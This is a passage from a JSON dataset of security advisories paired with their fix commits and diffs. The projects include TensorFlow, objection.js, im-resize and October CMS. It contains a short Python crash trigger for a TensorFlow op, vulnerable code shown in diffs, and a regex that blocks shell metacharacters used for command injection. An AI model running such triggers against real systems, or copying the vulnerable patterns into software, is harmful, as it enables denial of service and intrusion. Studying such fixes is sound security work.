questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a","commit_sha":"fca9874a9b42a2134f907d2fb46ab774a831404a","patch":"SINGLE","chain_ord":"['fca9874a9b42a2134f907d2fb46ab774a831404a']","before_first_fix_commit":"{'496c2630e51c1a478f095b084329acedb253db6b'}","last_fix_commit":"fca9874a9b42a2134f907d2fb46ab774a831404a","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 00:33:11","message":"Prevent another division by zero.\n\nPiperOrigin-RevId: 369338598\nChange-Id: I55471d363e401fdcf8d259670ad4eef672b731e2","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/conv_grad_shape_utils.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/fca9874a9b42a2134f907d2fb46ab774a831404a\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_shape_utils.cc', 'patch': '@@ -127,6 +127,10 @@ Status ConvBackpropComputeDimensionsV2(\\n   \/\/ dimensions of the filter Tensor.\\n   VLOG(2) << \"input vs filter_in depth \" << dims->in_depth << \" \"\\n           << filter_shape.dim_size(num_dims - 2);\\n+  if (filter_shape.dim_size(num_dims - 2) <= 0) {\\n+    return errors ::InvalidArgument(\\n+        label, \": filter depth must be strictly greated than zero\");\\n+  }\\n   if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) {\\n     return errors::InvalidArgument(\\n         label, \": input depth must be evenly divisible by filter depth\");'}}","message_norm":"prevent another division by zero.\n\npiperorigin-revid: 369338598\nchange-id: i55471d363e401fdcf8d259670ad4eef672b731e2","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('369338598', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_shape_utils.cc'])","num_files":1.0},{"index":2871,"vuln_id":"GHSA-r5jw-62xg-j433","cwe_id":"{'CWE-79'}","score":6.4,"chain":"{'https:\/\/github.com\/kaminari\/kaminari\/commit\/8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8'}","dataset":"osv","summary":"Cross-Site Scripting in Kaminari ### Impact\nIn Kaminari before 1.2.1, there is a vulnerability that would allow an attacker to inject arbitrary code into pages with pagination links. This has been fixed in 1.2.1.\n\n### Releases\nThe 1.2.1 gem including the patch has already been released.\nAll past released versions are affected by this vulnerability.\n\n### Workarounds\nApplication developers who can't update the gem can workaround by overriding the `PARAM_KEY_EXCEPT_LIST` constant.\n\n```ruby\nmodule Kaminari::Helpers\n  PARAM_KEY_EXCEPT_LIST = [:authenticity_token, :commit, :utf8, :_method, :script_name, :original_script_name].freeze\nend\n```\n\n### Credits\nThanks to Daniel Mircea for finding the issue and sending a patch via GitHub. Also thanks to Aditya Prakash for reporting the vulnerability.","published_date":"2020-05-28","chain_len":1,"project":"https:\/\/github.com\/kaminari\/kaminari","commit_href":"https:\/\/github.com\/kaminari\/kaminari\/commit\/8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8","commit_sha":"8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8","patch":"SINGLE","chain_ord":"['8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8']","before_first_fix_commit":"{'04d86ed3f2537aff620941413e5fca254e87aebe'}","last_fix_commit":"8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2020, 21:02:59","message":"Blacklist \"original_script_name\" get param","author":"Daniel Mircea","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'kaminari-core\/lib\/kaminari\/helpers\/tags.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kaminari\/kaminari\/raw\/8dd52a1aed3d2fa2835d836de23fc0d8c4ff5db8\/kaminari-core%2Flib%2Fkaminari%2Fhelpers%2Ftags.rb', 'patch': '@@ -2,7 +2,7 @@\\n \\n module Kaminari\\n   module Helpers\\n-    PARAM_KEY_EXCEPT_LIST = [:authenticity_token, :commit, :utf8, :_method, :script_name].freeze\\n+    PARAM_KEY_EXCEPT_LIST = [:authenticity_token, :commit, :utf8, :_method, :script_name, :original_script_name].freeze\\n \\n     # A tag stands for an HTML tag inside the paginator.\\n     # Basically, a tag has its own partial template file, so every tag can be'}}","message_norm":"blacklist \"original_script_name\" get param","language":"ca","entities":"[('blacklist', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['kaminari-core\/lib\/kaminari\/helpers\/tags.rb'])","num_files":1.0},{"index":2873,"vuln_id":"GHSA-r626-fc64-3q28","cwe_id":"{'CWE-362', 'CWE-119'}","score":8.1,"chain":"{'https:\/\/github.com\/SonicFrog\/abox\/commit\/34c2b9e51cd7b85a3366104092ca4e5e9fab227d'}","dataset":"osv","summary":"Data race in abox An issue was discovered in the abox crate before 0.4.1 for Rust. \n\nAffected versions of this crate implements `Send`\/`Sync` for `AtomicBox<T>` without requiring `T: Send`\/`T: Sync`. This allows to create data races to `T: !Sync` and send `T: !Send` to another thread.\n\nSuch behavior breaks the compile-time thread safety guarantees of Rust, and allows users to incur undefined behavior using safe Rust (e.g. memory corruption from data race).\n\nThe flaw was corrected in commit 34c2b9e by adding trait bound `T: Send` to `Send` impl for `AtomicBox<T>` and trait bound `T: Sync` to `Sync` impl for `AtomicBox<T>`.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/SonicFrog\/abox","commit_href":"https:\/\/github.com\/SonicFrog\/abox\/commit\/34c2b9e51cd7b85a3366104092ca4e5e9fab227d","commit_sha":"34c2b9e51cd7b85a3366104092ca4e5e9fab227d","patch":"SINGLE","chain_ord":"['34c2b9e51cd7b85a3366104092ca4e5e9fab227d']","before_first_fix_commit":"{'5abe75222bc49af6b62ea37f87d7be0c56973310'}","last_fix_commit":"34c2b9e51cd7b85a3366104092ca4e5e9fab227d","chain_ord_pos":1.0,"commit_datetime":"01\/23\/2021, 02:40:32","message":"send\/sync fix to prevent misuse","author":"JOE1994","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/lib.rs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/SonicFrog\/abox\/raw\/34c2b9e51cd7b85a3366104092ca4e5e9fab227d\/src%2Flib.rs', 'patch': '@@ -89,8 +89,8 @@ impl<T: Sized> Drop for AtomicBox<T> {\\n     }\\n }\\n \\n-unsafe impl<T: Sized> Sync for AtomicBox<T> {}\\n-unsafe impl<T: Sized> Send for AtomicBox<T> {}\\n+unsafe impl<T: Sized + Sync> Sync for AtomicBox<T> {}\\n+unsafe impl<T: Sized + Send> Send for AtomicBox<T> {}\\n \\n #[cfg(test)]\\n mod tests {'}}","message_norm":"send\/sync fix to prevent misuse","language":"en","entities":"[('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":2876,"vuln_id":"GHSA-r659-8xfp-j327","cwe_id":"{'CWE-1321', 'CWE-915'}","score":9.8,"chain":"{'https:\/\/github.com\/Vincit\/objection.js\/commit\/46b842a6bc897198b83f41ac85c92864b991d7e9', 'https:\/\/github.com\/vincit\/objection.js\/commit\/b41aab8dcd78f426f7468dcda541a7aca18a66a6'}","dataset":"osv","summary":"objection.js Prototype Pollution vulnerability before v2.2.16 objection.js prior to version 2.2.16 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). This issue is patched in version 2.2.16.","published_date":"2021-09-07","chain_len":2,"project":"https:\/\/github.com\/Vincit\/objection.js","commit_href":"https:\/\/github.com\/Vincit\/objection.js\/commit\/46b842a6bc897198b83f41ac85c92864b991d7e9","commit_sha":"46b842a6bc897198b83f41ac85c92864b991d7e9","patch":"MULTI","chain_ord":"['b41aab8dcd78f426f7468dcda541a7aca18a66a6', '46b842a6bc897198b83f41ac85c92864b991d7e9']","before_first_fix_commit":"{'260b284a1cbfb044991894c5a3cf3dedc8ce7267'}","last_fix_commit":"46b842a6bc897198b83f41ac85c92864b991d7e9","chain_ord_pos":2.0,"commit_datetime":"09\/03\/2021, 09:24:20","message":"Security Fix for Prototype Pollution\n\nFix prototype pollution when path components are not strings","author":"ready-research","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'lib\/utils\/objectUtils.js': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Vincit\/objection.js\/raw\/46b842a6bc897198b83f41ac85c92864b991d7e9\/lib%2Futils%2FobjectUtils.js', 'patch': \"@@ -225,6 +225,9 @@ function set(obj, path, value) {\\n \\n   for (let i = 0, l = path.length - 1; i < l; ++i) {\\n     const key = path[i];\\n+    if (key === '__proto__') {\\n+      return false;\\n+    }\\n     let child = obj[key];\\n \\n     if (!isObject(child)) {\\n@@ -252,7 +255,10 @@ function set(obj, path, value) {\\n function zipObject(keys, values) {\\n   const out = {};\\n \\n-  for (let i = 0, l = keys.length; i < l; ++i) {\\n+  for (let i = 0, l = keys.length; i < l; ++i) {    \\n+    if (keys[i] === '__proto__') {\\n+      return false;\\n+    }\\n     out[keys[i]] = values[i];\\n   }\"}}","message_norm":"security fix for prototype pollution\n\nfix prototype pollution when path components are not strings","language":"en","entities":"[('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/utils\/objectUtils.js'])","num_files":1.0},{"index":2881,"vuln_id":"GHSA-r6cm-wg48-rh2r","cwe_id":"{'CWE-359', 'CWE-863'}","score":9.1,"chain":"{'https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/44af526a6fc5e898bc1e0132b2af9eb3a9b2c466'}","dataset":"osv","summary":"Exposure of Private Personal Information to an Unauthorized Actor in alextselegidis\/easyappointments The software is a booking management system that has a public form to place bookings, and a private area for the calendar and management of services, users, settings, etc. There is a backend API that allows data manipulation, including listing the appointments for a specific time range. This happens on this endpoint: \/index.php\/backend_api\/ajax_get_calendar_events Unfortunately, there is no authentication \/ permissions-check on that endpoint, the only required parameters in a POST request are \"startDate\", \"endDate\" and \"csrfToken\". Because the csrfToken can be obtained by any unauthenticated user just visiting the public form (and is valid for the backend as well), any attacker can query the backend API and obtain all sorts of private information about the appointment, in JSON format.","published_date":"2022-03-10","chain_len":1,"project":"https:\/\/github.com\/alextselegidis\/easyappointments","commit_href":"https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/44af526a6fc5e898bc1e0132b2af9eb3a9b2c466","commit_sha":"44af526a6fc5e898bc1e0132b2af9eb3a9b2c466","patch":"SINGLE","chain_ord":"['44af526a6fc5e898bc1e0132b2af9eb3a9b2c466']","before_first_fix_commit":"{'13e81c80b17dfe207b2bdddb395a1345217f2548'}","last_fix_commit":"44af526a6fc5e898bc1e0132b2af9eb3a9b2c466","chain_ord_pos":1.0,"commit_datetime":"03\/08\/2022, 17:27:15","message":"Release v1.4.3","author":"Alex Tselegidis","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'application\/config\/config.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alextselegidis\/easyappointments\/raw\/44af526a6fc5e898bc1e0132b2af9eb3a9b2c466\/application%2Fconfig%2Fconfig.php', 'patch': \"@@ -8,7 +8,7 @@\\n | Declare some of the global config values of Easy!Appointments.\\n |\\n *\/\\n-$config['version'] = '1.4.3-beta.1'; \/\/ This must be changed manually.\\n+$config['version'] = '1.4.3'; \/\/ This must be changed manually.\\n $config['release_label'] = ''; \/\/ Leave empty for no title or add Alpha, Beta etc ...\\n $config['debug'] = Config::DEBUG_MODE;\\n \\n@@ -314,7 +314,7 @@\\n | new release.\\n |\\n *\/\\n-$config['cache_busting_token'] = '8UC842';\\n+$config['cache_busting_token'] = '6398SW';\\n \\n \/*\\n |--------------------------------------------------------------------------\"}}","message_norm":"release v1.4.3","language":"sl","entities":"[('v1.4.3', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['application\/config\/config.php'])","num_files":1.0},{"index":2885,"vuln_id":"GHSA-r6pg-pjwc-j585","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/faa76f39014ed3b5e2c158593b1335522e573c7f'}","dataset":"osv","summary":"Null pointer dereference in `SparseFillEmptyRows` ### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndense_shape = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = 0\n    \ntf.raw_ops.SparseFillEmptyRows(\n    indices=indices, values=values, dense_shape=dense_shape,\n    default_value=default_value)\n```\n\nThis is because of missing [validation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/fdc82089d206e281c628a93771336bf87863d5e8\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc#L230-L231) that was covered under a `TODO`. If the `dense_shape` tensor is empty, then `dense_shape_t.vec<>()` would cause a null pointer dereference in the implementation of the op:\n\n```cc\ntemplate <typename T, typename Tindex>\nstruct SparseFillEmptyRows<CPUDevice, T, Tindex> {\n  Status operator()(OpKernelContext* context, const Tensor& default_value_t,\n                    const Tensor& indices_t, const Tensor& values_t,\n                    const Tensor& dense_shape_t,\n                    typename AsyncOpKernel::DoneCallback done) {\n    ...\n    const auto dense_shape = dense_shape_t.vec<Tindex>();\n    ... \n  }\n}\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [faa76f39014ed3b5e2c158593b1335522e573c7f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/faa76f39014ed3b5e2c158593b1335522e573c7f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/faa76f39014ed3b5e2c158593b1335522e573c7f","commit_sha":"faa76f39014ed3b5e2c158593b1335522e573c7f","patch":"SINGLE","chain_ord":"['faa76f39014ed3b5e2c158593b1335522e573c7f']","before_first_fix_commit":"{'fdc82089d206e281c628a93771336bf87863d5e8'}","last_fix_commit":"faa76f39014ed3b5e2c158593b1335522e573c7f","chain_ord_pos":1.0,"commit_datetime":"05\/04\/2021, 22:35:39","message":"Fix heap-buffer-overflow issue with `tf.raw_ops.SparseFillEmptyRows`.\n\nPiperOrigin-RevId: 372009178\nChange-Id: Ia1a9e9691ecaa072f32fb39a0887b2aabd399210","author":"Amit Patankar","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/faa76f39014ed3b5e2c158593b1335522e573c7f\/tensorflow%2Fcore%2Fkernels%2Fsparse_fill_empty_rows_op.cc', 'patch': '@@ -228,7 +228,10 @@ void SparseFillEmptyRowsOpImpl(OpKernelContext* context,\\n                               default_value_t.shape().DebugString()),\\n       done);\\n   \/\/ TODO(ebrevdo): add shape checks between values, indices,\\n-  \/\/ dense_shape.  Also add check that dense rank > 0.\\n+  \/\/ Also add check that dense rank > 0.\\n+  OP_REQUIRES_ASYNC(context, dense_shape_t.NumElements() != 0,\\n+                    errors::InvalidArgument(\"Dense shape cannot be empty.\"),\\n+                    done);\\n \\n   using FunctorType = functor::SparseFillEmptyRows<Device, T, Tindex>;\\n   OP_REQUIRES_OK_ASYNC(context,'}}","message_norm":"fix heap-buffer-overflow issue with `tf.raw_ops.sparsefillemptyrows`.\n\npiperorigin-revid: 372009178\nchange-id: ia1a9e9691ecaa072f32fb39a0887b2aabd399210","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372009178', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc'])","num_files":1.0},{"index":2899,"vuln_id":"GHSA-r89v-cgv7-3jhx","cwe_id":"{'CWE-862'}","score":5.2,"chain":"{'https:\/\/github.com\/octobercms\/october\/commit\/d34fb8ab51108495a9a651b841202d935f4e12f7'}","dataset":"osv","summary":"Bypass of fix for CVE-2020-15247, Twig sandbox escape ### Impact\nA bypass of CVE-2020-15247 (fixed in 1.0.469 and 1.1.0) was discovered that has the same impact as CVE-2020-15247:\n\nAn authenticated backend user with the `cms.manage_pages`, `cms.manage_layouts`, or `cms.manage_partials` permissions who would **normally** not be permitted to provide PHP code to be executed by the CMS due to `cms.enableSafeMode` being enabled is able to write specific Twig code to escape the Twig sandbox and execute arbitrary PHP.\n\nThis is not a problem for anyone that trusts their users with those permissions to normally write & manage PHP within the CMS by not having `cms.enableSafeMode` enabled, but would be a problem for anyone relying on `cms.enableSafeMode` to ensure that users with those permissions in production do not have access to write & execute arbitrary PHP.\n\n### Patches\nIssue has been patched in Build 470 (v1.0.470) and v1.1.1.\n\n### Workarounds\nApply https:\/\/github.com\/octobercms\/october\/commit\/d34fb8ab51108495a9a651b841202d935f4e12f7 to your installation manually if unable to upgrade to Build 470 or v1.1.1.\n\n### References\nReported by [ka1n4t](https:\/\/github.com\/ka1n4t)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1108\" alt=\"Screen Shot 2020-10-10 at 1 21 13 PM\" src=\"https:\/\/user-images.githubusercontent.com\/7253840\/95663316-7de28b80-0afb-11eb-999d-a6526cf78709.png\">","published_date":"2020-11-23","chain_len":1,"project":"https:\/\/github.com\/octobercms\/october","commit_href":"https:\/\/github.com\/octobercms\/october\/commit\/d34fb8ab51108495a9a651b841202d935f4e12f7","commit_sha":"d34fb8ab51108495a9a651b841202d935f4e12f7","patch":"SINGLE","chain_ord":"['d34fb8ab51108495a9a651b841202d935f4e12f7']","before_first_fix_commit":"{'16e0bd4d094264fd00d0af86180bde4e0c73b4be'}","last_fix_commit":"d34fb8ab51108495a9a651b841202d935f4e12f7","chain_ord_pos":1.0,"commit_datetime":"11\/13\/2020, 09:48:27","message":"Improve Twig security policy\n\nFollow up to https:\/\/github.com\/octobercms\/october\/compare\/106daa2930de4cebb18732732d47d4056f01dd5b...7cb148c1677373ac30ccfd3069d18098e403e1ca. Thanks to @ka1n4t for the additional review.","author":"Luke Towers","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'modules\/system\/twig\/SecurityPolicy.php': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/october\/raw\/d34fb8ab51108495a9a651b841202d935f4e12f7\/modules%2Fsystem%2Ftwig%2FSecurityPolicy.php', 'patch': \"@@ -20,6 +20,8 @@ final class SecurityPolicy implements SecurityPolicyInterface\\n     protected $blockedMethods = [\\n         'addDynamicMethod',\\n         'addDynamicProperty',\\n+        'bindEvent',\\n+        'bindEventOnce',\\n     ];\\n \\n     \/**\"}}","message_norm":"improve twig security policy\n\nfollow up to https:\/\/github.com\/octobercms\/october\/compare\/106daa2930de4cebb18732732d47d4056f01dd5b...7cb148c1677373ac30ccfd3069d18098e403e1ca. thanks to @ka1n4t for the additional review.","language":"en","entities":"[('improve', 'ACTION', ''), ('security', 'SECWORD', ''), ('https:\/\/github.com\/octobercms\/october\/compare\/106daa2930de4cebb18732732d47d4056f01dd5b...7cb148c1677373ac30ccfd3069d18098e403e1ca', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/system\/twig\/SecurityPolicy.php'])","num_files":1.0},{"index":2901,"vuln_id":"GHSA-r8j4-96mx-rjcc","cwe_id":"{'CWE-611'}","score":5.5,"chain":"{'https:\/\/github.com\/skylot\/jadx\/commit\/d22db30166e7cb369d72be41382bb63ac8b81c52'}","dataset":"osv","summary":"Improper Restriction of XML External Entity Reference in skylot\/jadx skylot\/jadx prior to 1.3.2 is vulnerable to Improper Restriction of XML External Entities when a user is tricked into exporting a malicious APK file (via the -e option) containing a crafted AndroidManifest.xml \/ strings.xml to gradle, leading to possible local file disclosure.","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/skylot\/jadx","commit_href":"https:\/\/github.com\/skylot\/jadx\/commit\/d22db30166e7cb369d72be41382bb63ac8b81c52","commit_sha":"d22db30166e7cb369d72be41382bb63ac8b81c52","patch":"SINGLE","chain_ord":"['d22db30166e7cb369d72be41382bb63ac8b81c52']","before_first_fix_commit":"{'6db61e7a5908db0138a3a15d42c0a46ae787c72c'}","last_fix_commit":"d22db30166e7cb369d72be41382bb63ac8b81c52","chain_ord_pos":1.0,"commit_datetime":"01\/20\/2022, 11:17:12","message":"fix: use secure xml parser for process manifest","author":"Skylot","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'jadx-core\/src\/main\/java\/jadx\/core\/export\/ExportGradleProject.java': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/skylot\/jadx\/raw\/d22db30166e7cb369d72be41382bb63ac8b81c52\/jadx-core%2Fsrc%2Fmain%2Fjava%2Fjadx%2Fcore%2Fexport%2FExportGradleProject.java', 'patch': '@@ -8,7 +8,6 @@\\n import java.util.Set;\\n \\n import javax.xml.parsers.DocumentBuilder;\\n-import javax.xml.parsers.DocumentBuilderFactory;\\n \\n import org.slf4j.Logger;\\n import org.slf4j.LoggerFactory;\\n@@ -24,6 +23,7 @@\\n import jadx.core.utils.exceptions.JadxRuntimeException;\\n import jadx.core.utils.files.FileUtils;\\n import jadx.core.xmlgen.ResContainer;\\n+import jadx.core.xmlgen.XmlSecurity;\\n \\n public class ExportGradleProject {\\n \\n@@ -139,7 +139,7 @@ private ApplicationParams getApplicationParams(Document androidManifest, Documen\\n \\n \\tprivate Document parseXml(String xmlContent) {\\n \\t\\ttry {\\n-\\t\\t\\tDocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\\n+\\t\\t\\tDocumentBuilder builder = XmlSecurity.getSecureDbf().newDocumentBuilder();\\n \\t\\t\\tDocument document = builder.parse(new InputSource(new StringReader(xmlContent)));\\n \\n \\t\\t\\tdocument.getDocumentElement().normalize();'}}","message_norm":"fix: use secure xml parser for process manifest","language":"ca","entities":"[('fix', 'ACTION', ''), ('secure', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['jadx-core\/src\/main\/java\/jadx\/core\/export\/ExportGradleProject.java'])","num_files":1.0},{"index":2909,"vuln_id":"GHSA-r9vm-rhmf-7hxx","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/Turistforeningen\/node-im-resize\/commit\/de624dacf6a50e39fe3472af1414d44937ce1f03'}","dataset":"osv","summary":"OS Command Injection in im-resize im-resize through 2.3.2 allows remote attackers to execute arbitrary commands via the \"exec\" argument. The cmd argument used within index.js, can be controlled by user without any sanitization.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/Turistforeningen\/node-im-resize","commit_href":"https:\/\/github.com\/Turistforeningen\/node-im-resize\/commit\/de624dacf6a50e39fe3472af1414d44937ce1f03","commit_sha":"de624dacf6a50e39fe3472af1414d44937ce1f03","patch":"SINGLE","chain_ord":"['de624dacf6a50e39fe3472af1414d44937ce1f03']","before_first_fix_commit":"{'499fe82028337ae55cb61c24696c1ec16f0f9c9a'}","last_fix_commit":"de624dacf6a50e39fe3472af1414d44937ce1f03","chain_ord_pos":1.0,"commit_datetime":"02\/03\/2020, 21:25:54","message":"fix: check image arguments before processing (#19)\n\nRegex hotfix to check for command injection","author":"Sam Sanoop","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'index.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Turistforeningen\/node-im-resize\/raw\/de624dacf6a50e39fe3472af1414d44937ce1f03\/index.js', 'patch': \"@@ -7,13 +7,17 @@ var join = require('path').join;\\n var sprintf = require('util').format;\\n \\n module.exports = function(image, output, cb) {\\n+  if(\/;|&|`|\\\\$|\\\\(|\\\\)|\\\\|\\\\||\\\\||!|>|<|\\\\?|\\\\${\/g.test(JSON.stringify(image))) {\\n+    console.log('Input Validation failed, Suspicious Characters found');\\n+  } else {\\n   var cmd = module.exports.cmd(image, output);\\n   exec(cmd, {timeout: 30000}, function(e, stdout, stderr) {\\n     if (e) { return cb(e); }\\n     if (stderr) { return cb(new Error(stderr)); }\\n \\n     return cb(null, output.versions);\\n   });\\n+}\\n };\\n \\n \/**\"}}","message_norm":"fix: check image arguments before processing (#19)\n\nregex hotfix to check for command injection","language":"en","entities":"[('#19', 'ISSUE', ''), ('hotfix', 'ACTION', ''), ('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":2915,"vuln_id":"GHSA-rc8h-3fv6-pxv8","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/hapijs\/hapi\/commit\/aab2496e930dce5ee1ab28eecec94e0e45f03580'}","dataset":"osv","summary":"Denial of Service in hapi Versions of `hapi` prior to 11.1.3 are affected by a denial of service vulnerability.\n\nThe vulnerability is triggered when certain input is passed into the If-Modified-Since or Last-Modified headers.\n\nThis causes an 'illegal access' exception to be raised, and instead of sending a HTTP 500 error back to the sender, hapi will continue to hold the socket open until timed out (default node timeout is 2 minutes).\n\n\n\n\n\n## Recommendation\n\nUpdate to v11.1.3 or later","published_date":"2018-06-07","chain_len":1,"project":"https:\/\/github.com\/hapijs\/hapi","commit_href":"https:\/\/github.com\/hapijs\/hapi\/commit\/aab2496e930dce5ee1ab28eecec94e0e45f03580","commit_sha":"aab2496e930dce5ee1ab28eecec94e0e45f03580","patch":"SINGLE","chain_ord":"['aab2496e930dce5ee1ab28eecec94e0e45f03580']","before_first_fix_commit":"{'1ad65ba793377928aa5a2dfc819888c5c9793394', 'ef2a0f85d558eeb102c512fac45386b2145cb903'}","last_fix_commit":"aab2496e930dce5ee1ab28eecec94e0e45f03580","chain_ord_pos":1.0,"commit_datetime":"12\/23\/2015, 21:54:47","message":"Merge pull request #2988 from hapijs\/v11.1.x\n\nHandle invalid date exceptions","author":"Eran Hammer","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'lib\/transmit.js': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hapijs\/hapi\/raw\/aab2496e930dce5ee1ab28eecec94e0e45f03580\/lib%2Ftransmit.js', 'patch': '@@ -82,8 +82,8 @@ internals.marshal = function (request, next) {\\n \\n                 \/\/ Weak verifier\\n \\n-                const ifModifiedSince = Date.parse(ifModifiedSinceHeader);\\n-                const lastModified = Date.parse(lastModifiedHeader);\\n+                const ifModifiedSince = internals.parseDate(ifModifiedSinceHeader);\\n+                const lastModified = internals.parseDate(lastModifiedHeader);\\n \\n                 if (ifModifiedSince &&\\n                     lastModified &&\\n@@ -147,6 +147,15 @@ internals.marshal = function (request, next) {\\n };\\n \\n \\n+internals.parseDate = function (string) {\\n+\\n+    try {\\n+        return Date.parse(string);\\n+    }\\n+    catch (errIgnore) { }\\n+};\\n+\\n+\\n internals.fail = function (request, boom, callback) {\\n \\n     const error = boom.output;'}}","message_norm":"merge pull request #2988 from hapijs\/v11.1.x\n\nhandle invalid date exceptions","language":"en","entities":"[('#2988', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/transmit.js'])","num_files":1.0},{"index":2918,"vuln_id":"GHSA-rcj2-vvjx-87pm","cwe_id":"{'CWE-311'}","score":5.9,"chain":"{'https:\/\/github.com\/arrow-kt\/arrow\/commit\/74198dab522393487d5344f194dc21208ab71ae8'}","dataset":"osv","summary":"Missing Encryption of Sensitive Data in arrow-kt Arrow arrow-kt Arrow before 0.9.0 resolved Gradle build artifacts (for compiling and building the published JARs) over HTTP instead of HTTPS. Any of these dependent artifacts could have been maliciously compromised by an MITM 